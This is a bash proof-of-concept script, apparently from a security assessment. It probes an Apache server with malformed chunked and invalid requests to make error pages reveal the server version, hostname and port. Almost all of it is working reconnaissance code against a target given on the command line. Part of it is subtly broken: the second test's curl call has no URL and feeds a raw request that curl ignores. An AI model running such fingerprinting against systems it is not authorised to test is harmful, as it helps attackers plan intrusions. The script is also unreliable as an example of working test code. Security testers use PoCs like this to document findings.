#!/bin/bash

# POC: Information Disclosure in Error Pages
# This script demonstrates that error pages expose detailed server information
# including Apache version, hostname, and port number

TARGET="${1:-http://localhost}"
OUTPUT_FILE="/tmp/error_page_response.html"

echo "[*] Testing Information Disclosure in Error Pages"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Trigger 411 Length Required error
echo "[+] Test 1: Triggering 411 Length Required error..."
curl -s -H "Transfer-Encoding: chunked" -d "0\r\n\r\n" "$TARGET" > "$OUTPUT_FILE" 2>&1

# Check if response contains server information
if grep -q "Apache" "$OUTPUT_FILE"; then
    echo "[✓] Apache version information found in error page"
    APACHE_VERSION=$(grep -oP 'Apache/\d+\.\d+\.\d+[^<]*' "$OUTPUT_FILE" | head -1)
    echo "    Version: $APACHE_VERSION"
else
    echo "[✗] Apache version not found in response"
fi

if grep -q "localhost" "$OUTPUT_FILE"; then
    echo "[✓] Hostname 'localhost' found in error page"
else
    echo "[✗] Hostname not found in response"
fi

if grep -q "Port 80" "$OUTPUT_FILE"; then
    echo "[✓] Port number found in error page"
else
    echo "[✗] Port number not found in response"
fi

echo ""
echo "[+] Test 2: Triggering 400 Bad Request error..."
# Test 2: Trigger 400 Bad Request by sending malformed request
curl -s -o "$OUTPUT_FILE" 2>&1 << 'EOF'
GET /<invalid> HTTP/1.1
Host: localhost
Invalid-Header-Syntax: value1: value2

EOF

# Check for server details in 400 error
if grep -q "Apache" "$OUTPUT_FILE" || curl -s "$TARGET/nonexistent" | grep -q "Apache"; then
    echo "[✓] Server information disclosed in error responses"
else
    echo "[✗] Minimal error response received"
fi

echo ""
echo "[+] Test 3: Making request to trigger error and capture full response..."
ERROR_RESPONSE=$(curl -s -i "$TARGET" 2>&1)

if echo "$ERROR_RESPONSE" | grep -q "Apache.*Debian"; then
    echo "[✓] VULNERABILITY CONFIRMED: Detailed server information exposed"
    echo ""
    echo "[*] Response excerpt containing sensitive information:"
    echo "---"
    echo "$ERROR_RESPONSE" | grep -i "apache\|localhost\|port" | head -5
    echo "---"
    exit 0
else
    # Try alternate approach - request without proper headers
    ERROR_RESPONSE=$(curl -s "$TARGET" -H "Transfer-Encoding: chunked" -d "" 2>&1)
    if echo "$ERROR_RESPONSE" | grep -q "Apache"; then
        echo "[✓] VULNERABILITY CONFIRMED: Server information exposed in error page"
        echo ""
        echo "[*] Response contains:"
        echo "---"
        echo "$ERROR_RESPONSE" | grep -i "apache" | head -3
        echo "---"
        exit 0
    fi
fi

echo "[!] Could not confirm vulnerability - server may have hardened error messages"
exit 1